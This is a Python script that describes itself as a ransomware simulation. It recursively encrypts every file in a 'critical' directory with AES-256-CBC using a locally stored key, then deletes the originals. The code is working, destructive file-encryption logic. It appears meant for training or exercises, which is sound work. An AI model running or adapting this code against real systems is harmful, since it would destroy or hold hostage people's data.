# encrypt.py
# This script simulates ransomware by encrypting all files within the "critical" directory
# using AES-256-CBC encryption. It loads the encryption key from the "key.txt" file
# and deletes the original files after successful encryption.

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
import os
import base64

def load_key():
    """Loads the AES key from key.txt"""
    with open("key.txt", "rb") as key_file:
        lines = key_file.readlines()
        salt = lines[0].strip()  # Read the salt (not directly used in encryption here)
        key = lines[1].strip()    # Read the base64 encoded key
        return base64.urlsafe_b64decode(key)  # Decode the key from base64

def encrypt_file(file_path, key):
    """Encrypts a file using AES-256-CBC."""
    with open(file_path, "rb") as f:
        data = f.read()
    
    iv = os.urandom(16)  # Generate a new 16-byte Initialization Vector (IV)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    padder = PKCS7(128).padder()  # Use PKCS#7 padding with a block size of 128 bits (for AES)
    padded_data = padder.update(data) + padder.finalize()
    
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path + ".enc", "wb") as f:
        f.write(iv + encrypted_data)  # Write the IV and then the encrypted data

    os.remove(file_path)  # Delete the original file

def encrypt_directory(directory, key):
    """Recursively encrypts all files in a directory."""
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

# Load key
key = load_key()

# Encrypt all files in "critical"
encrypt_directory("critical", key)
print("Encryption completed successfully.")